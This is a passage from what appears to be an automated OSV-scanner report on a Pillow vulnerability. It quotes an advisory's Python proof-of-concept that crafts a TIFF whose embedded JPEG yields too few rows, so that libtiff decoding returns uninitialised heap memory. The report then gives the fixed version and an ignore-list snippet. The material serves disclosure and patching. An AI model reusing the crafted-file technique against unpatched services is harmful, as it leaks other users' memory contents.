JPEG codec decoded\n\u003e # fewer rows than RowsPerStrip/TileLength.  Two independent signals:\n\u003e #  pass 1 (normal heap): seed freed 64 KiB chunks with b\"LEAK\" just before load() and\n\u003e #         count copies of LEAK in the decoded pixels (file contains no such bytes);\n\u003e #  pass 2 (same script re-run under glibc MALLOC_PERTURB_=170): fresh malloc memory is\n\u003e #         0x55, so rows that come back all-0x55 are provably uninitialised heap.\n\u003e import gc, io, os, struct, subprocess, sys\n\u003e from PIL import Image\n\u003e W = H = 256; ROWS = 8\n\u003e perturbed = os.environ.get(\"MALLOC_PERTURB_\") == \"170\"\n\u003e if not perturbed:\n\u003e     print(\"Pillow\", Image.__version__, Image.core.__file__)\n\u003e \n\u003e def tiff(jpeg_rows, tiled):\n\u003e     j = io.BytesIO(); Image.new(\"L\", (W, jpeg_rows), 200).save(j, \"JPEG\"); j = j.getvalue()\n\u003e     tags = [(256,3,1,W), (257,3,1,H), (258,3,1,8), (259,3,1,7), (262,3,1,1), (277,3,1,1)]\n\u003e     tags += ([(322,3,1,W), (323,3,1,H), (324,4,1,0), (325,4,1,len(j))] if tiled else\n\u003e              [(273,4,1,0), (278,3,1,H), (279,4,1,len(j))])\n\u003e     tags.sort(); off = 8 + 2 + 12*len(tags) + 4\n\u003e     tags = [(t,ty,c, off if t in (273,324) else v) for t,ty,c,v in tags]\n\u003e     ifd = struct.pack(\"\u003cH\", len(tags)) + b\"\".join(struct.pack(\"\u003cHHLL\", *t) for t in tags)\n\u003e     return b\"II*\\0\" + struct.pack(\"\u003cL\", 8) + ifd + struct.pack(\"\u003cL\", 0) + j\n\u003e \n\u003e bug = False\n\u003e for tiled in (False, True):\n\u003e     for jpeg_rows, label in ((H, \"well-formed\"), (ROWS, \"crafted\")):\n\u003e         data = tiff(jpeg_rows, tiled); assert b\"LEAK\" not in data\n\u003e         im = Image.open(io.BytesIO(data)); assert im.tile[0][0] == \"libtiff\"\n\u003e         junk = [bytearray(b\"LEAK\" * (W*H//4)) for _ in range(6)]; del junk; gc.collect()\n\u003e         im.load()                                   # no exception for either file\n\u003e         below = im.tobytes()[W*ROWS:]\n\u003e         n55, nleak = below.count(0x55), below.count(b\"LEAK\")\n\u003e         print(f\"[{'perturb' if perturbed else 'normal '}] {'tiled' if tiled else 'strip'} \"\n\u003e               f\"{label:11s} ({len(data):4d} B) rows {ROWS}-{H-1}: {nleak:5d} x b'LEAK', \"\n\u003e               f\"{n55:5d}/{len(below)} == 0x55, head={below[:8]!r}\")\n\u003e         if jpeg_rows == ROWS and (nleak \u003e 0 or (perturbed and n55 == len(below))):\n\u003e             bug = True\n\u003e if not perturbed:\n\u003e     r = subprocess.run([sys.executable, sys.argv[0]], env={**os.environ, \"MALLOC_PERTURB_\": \"170\"},\n\u003e                        capture_output=True, text=True)\n\u003e     lines = r.stdout.rstrip().split(\"\\n\")\n\u003e     print(\"\\n\".join(lines[:-1])); sys.stderr.write(r.stderr)\n\u003e     bug = bug or lines[-1] == \"BUG\"\n\u003e print(\"BUG\" if bug else \"OK\")\n\u003e ```\n\u003e \u003c/details\u003e\n\u003e \n\u003e ---\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-q45j-58j2-45rg | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112897\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
